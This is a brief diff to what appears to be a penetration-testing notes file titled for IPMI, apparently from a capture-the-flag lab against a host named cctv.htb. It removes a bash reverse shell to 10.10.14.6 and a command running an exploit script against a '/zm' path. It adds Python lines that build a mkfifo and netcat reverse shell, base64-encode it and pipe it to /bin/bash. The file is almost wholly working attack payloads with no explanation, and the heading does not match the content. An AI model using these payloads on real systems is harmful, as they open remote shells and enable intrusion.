@@ -1,7 +1,10 @@
 # IPMI – Intelligent Platform Management Interface
-bash -c 'bash -i >& /dev/tcp/10.10.14.6/4444 0>&1'
 
-python3 51902.py -t http://cctv.htb/zm -ip 10.10.14.2 -p 4444
+ps1 = f"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {args.local_ip} {args.port} > /tmp/f"
+
+ps2 = base64.b64encode(ps1.encode()).decode()
+
+payload = f"echo {ps2} | base64 -d | /bin/bash"
 
 
 
